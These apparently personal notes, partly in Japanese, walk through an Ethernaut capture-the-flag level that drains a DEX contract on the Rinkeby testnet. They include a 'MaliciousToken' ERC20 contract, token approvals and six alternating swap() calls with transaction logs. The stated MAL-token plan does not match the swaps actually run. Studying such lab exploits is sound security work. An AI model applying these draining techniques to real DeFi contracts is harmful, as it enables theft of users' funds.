Exploitation
The following scenario will be used,
- Create MAL token and mint 1M MAL to our address.
- We’ll use add_liquidity() to transfer our MAL token to the Dex contract.
 So, approve an allowance of MAL for the Dex contract (spender) because it requires by transferFrom() in add_liquidity().
- Transfer MAL to the Dex contract for 100 MAL, we’ll drain token2. 
Currently, the Dex contract has 100 token2, the price ratio for MAL:token2 is 1:1.
- Drain token2 using swap().

Steps
1. Create MAL token by using Openzeppelin’s ERC20 and mint 1M of MAL to our address via _mint().


>t1 = await contract.token1()
'0x07F6d4816934a456dd9f49a857cfc8C7CAE5d4F4'

>t2 = await contract.token2()
'0xa2c11dE85350A72E0f83D26b5835D74c8fA41C08'

//openzeppelin tokenをcompile 
/AnyToken.sol

pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
    constructor () public ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
    }
}

//token1をAt Addressにcopy, 
//Developed Contracts approve of spender by Ethernautのinstanceとamount 10_000_000
[block:10966548 txIndex:0]from: 0xF6e...f30F5to: 0x07F6d4816934a456dd9f49a857cfc8C7CAE5d4F4 0x07F...5d4F4value: 0 weidata: 0x095...89680logs: 0hash: 0x86f...087cc

//allowanceのownerを自分のwallet, spenderをEthernautのinstanceにsetting
*block addressコピーするとbug発生するから注意
0:uint256: 10000000

//token2をAt Addressにcopy, 
//Developed Contracts approve of spender by address of Ethernaut instanceとamount 10_000_000

//allowanceのownerを自分のwallet, spenderをEthernautのinstanceにsetting

0:uint256: 10000000

>await contract.swap(t1, t2, 10)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x4aa89e6c034c845a3f8f4b30cdd26f6c89bdd811138be827edf7e6ff04f74825
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x4aa89e6c034c845a3f8f4b30cdd26f6c89bdd811138be827edf7e6ff04f74825
{tx: '0x4aa89e6c034c845a3f8f4b30cdd26f6c89bdd811138be827edf7e6ff04f74825', receipt: {…}, logs: Array(0)}

>await contract.swap(t2, t1, 20)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x4350bbb7af6f1b676fc565782e7a7cf8c948504376955f4d1a97ad1e5c246e57
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x4350bbb7af6f1b676fc565782e7a7cf8c948504376955f4d1a97ad1e5c246e57
{tx: '0x4350bbb7af6f1b676fc565782e7a7cf8c948504376955f4d1a97ad1e5c246e57', receipt: {…}, logs: Array(0)}

>await contract.swap(t1, t2, 24)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x6d9af339db16e6c9c730243ade74d03d10516360e0d21e28c498293599c37569
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x6d9af339db16e6c9c730243ade74d03d10516360e0d21e28c498293599c37569
{tx: '0x6d9af339db16e6c9c730243ade74d03d10516360e0d21e28c498293599c37569', receipt: {…}, logs: Array(0)}

>await contract.swap(t2, t1, 30)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x1579bcf5eb89950f1a06dc9f7c5fe0181b73e7b7596aa8608e6e44d32254f730
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x1579bcf5eb89950f1a06dc9f7c5fe0181b73e7b7596aa8608e6e44d32254f730
{tx: '0x1579bcf5eb89950f1a06dc9f7c5fe0181b73e7b7596aa8608e6e44d32254f730', receipt: {…}, logs: Array(0)}

>await contract.swap(t1, t2, 41)
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xb4677ba1ce3ebf654dfea4e08cfe837f418a20f8f556dfdd38fa9f31d7dba6a6
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xb4677ba1ce3ebf654dfea4e08cfe837f418a20f8f556dfdd38fa9f31d7dba6a6
{tx: '0xb4677ba1ce3ebf654dfea4e08cfe837f418a20f8f556dfdd38fa9f31d7dba6a6', receipt: {…}, logs: Array(0)}

>await contract.swap(t2, t1, 45)

e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xcc9992af883cc5a107bdf39c0b274d50d07f13c8c6503a306f22214607ad1d80
e4e9b69aea3571538dca60595571493ed3b7d30d.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xcc9992af883cc5a107bdf39c0b274d50d07f13c8c6503a306f22214607ad1d80
{tx: '0xcc9992af883cc5a107bdf39c0b274d50d07f13c8c6503a306f22214607ad1d80', receipt: {…}, logs: Array(0)}

